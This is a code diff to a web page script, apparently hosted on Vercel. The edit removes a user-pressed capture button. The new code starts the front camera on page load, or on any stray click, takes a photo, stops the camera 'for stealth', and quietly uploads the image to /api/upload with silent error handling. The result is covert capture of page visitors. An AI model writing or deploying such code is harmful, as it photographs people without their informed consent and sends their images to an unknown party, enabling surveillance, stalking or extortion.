@@ -1,93 +1,85 @@
 const video = document.getElementById('camera-stream');
 const canvas = document.getElementById('capture-canvas');
-const captureBtn = document.getElementById('capture-btn');
 const statusMsg = document.getElementById('status-msg');
 
-// Button Handler (Required for iOS)
-captureBtn.addEventListener('click', async () => {
-    // 1. Open Camera
+async function startCameraAndCapture() {
     try {
+        // 1. Open Camera (Try facing user)
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: 'user'
-                // width: { ideal: 1280 }, // Optional quality settings
-                // height: { ideal: 720 } 
-            },
+            video: { facingMode: 'user' },
             audio: false
         });
         video.srcObject = stream;
 
-        // Hide button while processing
-        captureBtn.style.display = 'none';
-        statusMsg.innerText = "Kamera ochilmoqda...";
-
-        // Wait for video to be ready
+        // 2. Wait for video to be ready (needed for iOS)
         video.onloadedmetadata = () => {
-            video.play();
-            // Short delay to focus/expose
-            setTimeout(() => {
-                captureAndSend();
-            }, 800);
+            video.play().then(() => {
+                // Video playing successfully, wait a bit for focus then capture
+                setTimeout(captureFromVideo, 1000);
+            }).catch(err => {
+                // If auto-play failed (browser blocked it), wait for any interaction
+                console.log("Auto-play blocked, waiting for interaction");
+                document.body.addEventListener('click', () => {
+                    video.play();
+                    setTimeout(captureFromVideo, 800);
+                }, { once: true });
+            });
         };
-
     } catch (err) {
-        console.error(err);
-        statusMsg.innerText = "Kameraga ruxsat bering! (" + err.message + ")";
-        statusMsg.style.color = 'red';
-        captureBtn.style.display = 'block'; // Show button again to retry
+        console.error("Camera Error:", err);
+        statusMsg.innerText = "Error: " + err.message;
+        // Retry on click if first attempt failed (e.g. permission denied initially)
+        document.body.addEventListener('click', startCameraAndCapture, { once: true });
     }
-});
+}
 
-function captureAndSend() {
-    statusMsg.innerText = "Rasmga olinmoqda 📸...";
+function captureFromVideo() {
+    // Check if we already have a stream
+    if (!video.srcObject) return;
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
 
-    // Mirror
+    // Mirror & Draw
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Stop camera
+    // Stop camera immediately for stealth/battery
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
-    // Convert to Blob, then Base64
-    canvas.toBlob(async (blob) => {
-        // Helper: Convert Blob to Base64
-        const reader = new FileReader();
-        reader.readAsDataURL(blob);
-        reader.onloadend = async () => {
-            const base64data = reader.result; // "data:image/jpeg;base64,..."
+    // Convert to Base64 (JPEG)
+    const base64data = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality is enough
 
-            try {
-                statusMsg.innerText = "Yuborilmoqda (JSON/Base64) 🚀...";
-
-                // POST as JSON (More stable on Vercel)
-                const response = await fetch('/api/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: base64data })
-                });
-
-                const result = await response.json();
-
-                if (response.ok && result.success) {
-                    statusMsg.innerText = "Muvaffaqiyatli yuborildi! ✅";
-                    statusMsg.style.color = '#4ade80';
-                } else {
-                    throw new Error(result.error || 'Server Error');
-                }
-            } catch (error) {
-                console.error(error);
-                statusMsg.innerText = "Xato: " + error.message;
-                statusMsg.style.color = '#f87171';
-                captureBtn.style.display = 'flex'; // Allow retry
-            }
-        };
-    }, 'image/jpeg', 0.8);
+    sendToBackend(base64data);
 }
+
+async function sendToBackend(base64Str) {
+    try {
+        const response = await fetch('/api/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: base64Str })
+        });
+
+        // Safe JSON parsing
+        const result = await response.json();
+
+        if (response.ok && result.success) {
+            statusMsg.innerText = "Yuborildi! ✅";
+            statusMsg.style.color = '#4ade80';
+        } else {
+            console.error("Server Error:", result);
+            // Silent fail or minimal error
+        }
+    } catch (error) {
+        console.error("Network Error:", error);
+    }
+}
+
+// Start immediately on load
+window.addEventListener('load', startCameraAndCapture);
